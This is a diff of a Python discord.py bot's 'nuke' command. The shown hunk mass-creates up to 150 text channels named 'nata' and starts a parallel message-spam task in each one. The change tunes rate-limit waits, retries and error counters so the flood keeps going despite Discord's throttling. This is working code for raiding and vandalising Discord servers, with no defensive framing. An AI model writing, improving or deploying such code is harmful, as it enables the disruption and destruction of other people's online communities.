@@ -42640,21 +42640,33 @@ async def nuke_cmd(ctx: commands.Context):
             pass
 
     _created = 0
-    _attempts = 0
-    while _created < 150 and _attempts < 300:
-        _attempts += 1
+    _erros_seguidos = 0
+    while _created < 150:
         try:
             _new_ch = await guild.create_text_channel("nata", reason="Nuke — recriação")
             _created += 1
+            _erros_seguidos = 0
             if _first_ch is None:
                 _first_ch = _new_ch
-            asyncio.create_task(_nuke_send(_new_ch))  # envia mensagem em paralelo
-            await asyncio.sleep(0.25)
+            asyncio.create_task(_nuke_send(_new_ch))
+            await asyncio.sleep(0.4)
         except discord.RateLimited as _rl:
-            # espera o retry_after exato e retenta sem incrementar _created
-            await asyncio.sleep(min(float(getattr(_rl, "retry_after", 1)), 10) + 0.1)
-        except Exception:
-            await asyncio.sleep(0.5)
+            _wait = min(float(getattr(_rl, "retry_after", 5)), 30)
+            print(f"[nuke] rate limit criar canal ({_created}/150) — aguardando {_wait:.1f}s", flush=True)
+            await asyncio.sleep(_wait + 0.5)
+        except discord.HTTPException as _he:
+            print(f"[nuke] HTTPException criar canal: {_he.status} {_he.text}", flush=True)
+            _erros_seguidos += 1
+            if _erros_seguidos >= 10:
+                print(f"[nuke] 10 erros seguidos, abortando criação no canal {_created}", flush=True)
+                break
+            await asyncio.sleep(2)
+        except Exception as _exc:
+            print(f"[nuke] erro criar canal: {type(_exc).__name__}: {_exc}", flush=True)
+            _erros_seguidos += 1
+            if _erros_seguidos >= 10:
+                break
+            await asyncio.sleep(2)
 
 
 
